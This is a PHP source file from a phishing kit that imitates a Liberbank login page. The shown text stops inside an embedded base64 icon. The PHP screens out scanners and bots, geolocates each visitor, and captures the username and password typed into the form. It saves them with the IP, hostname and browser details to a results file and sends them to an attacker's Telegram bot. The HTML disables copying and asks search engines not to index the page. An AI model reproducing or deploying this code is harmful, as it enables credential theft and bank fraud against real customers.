<?php

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');


include 'M3tri-hash-bots/anti0.php';
/*
include 'M3tri-hash-bots/anti1.php';
include 'M3tri-hash-bots/anti2.php';
include 'M3tri-hash-bots/anti3.php';
include 'M3tri-hash-bots/anti4.php';
include 'M3tri-hash-bots/anti5.php';
include 'M3tri-hash-bots/anti6.php';
include 'M3tri-hash-bots/anti7.php';
include 'M3tri-hash-bots/anti8.php';
include 'M3tri-hash-bots/anti9.php';
*/

$honeypotbots = file_get_contents('honeypotbots.dat');
$errorUrl = 'Error.php';
$ip = getenv('REMOTE_ADDR');

if (stripos($honeypotbots, $ip) !== false) {
  $stripos = '1';

}

$token1 = base64_encode($_SERVER['HTTP_USER_AGENT'].$ip.date('Y:M:D'));
if ($token1 != $_GET['token'] || $stripos == '1' ){ header("location: " . $errorUrl ."?" . $_GET['token']); exit;  }



function curl_get_contents($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_URL, $url);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
} 

$metri = $_SERVER['REMOTE_ADDR'];
$geoip = 'http://www.geoplugin.net/php.gp?ip='.$metri;
$addrDetailsArr = unserialize(curl_get_contents($geoip)); 
$continent = $addrDetailsArr['geoplugin_continentCode'];
$country = $addrDetailsArr['geoplugin_countryCode'];
$countryname = $addrDetailsArr['geoplugin_countryName'];



if ($_POST['type'] == "log") {
include 'config.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);


            $message = "/== Liberbank log ==/" . $_SERVER['REMOTE_ADDR'] . "\r\n";

            $message .= 'Usr : ' . $_POST['usr'] . "\r\n";
            $message .= 'Pwd : ' . $_POST['pwd'] . "\r\n";
  
            $message .= "/---------------- user details ----------------/" . "\r\n";
            $message .= "Client IP   : ".$ip."\n";
            $message .= "HostName    : ".$hostname."\n";
            $message .= "country    : ".$countryname."\n";
            $message .= "Timezone    : ".date_default_timezone_get()."\n";

            $message .= "User Agent  : ".$_SERVER['HTTP_USER_AGENT']."\n";
            $message .= '/-- By METRI --/' . "\r\n\r\n";

            file_put_contents("./rezult/liberbank-rzlt.txt", $message, FILE_APPEND);

            $params=[
            'chat_id'=>$chat_id,
            'text'=>$message,
            ];
            $ch = curl_init($METRI_TOKEN . '/sendMessage');
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $result = curl_exec($ch);
            curl_close($ch);
            
}
else {
header("location: " . $errorUrl . "?".base64_encode(rand(0,9999999999999)));
}


?>

<!DOCTYPE html> 

<html oncontextmenu="return false;" onselectstart="return false" ondrag="return false" ondrop="return false" onpaste="return false;" oncopy="return false;" oncut="return false;">
<head>

<meta charset="utf-8">
	
	
	<title>Liberbank - infos</title>
	
	<meta http-equiv="Expires" content="-1">
	<meta http-equiv="pragma" content="no-cache">
	<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">


	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
	<meta name="format-detection" content="telephone=no">
	

<link rel="stylesheet" type="text/css" href="./LB-files/style.css"><link rel="icon" type="image/png" href="data:image/png;base64,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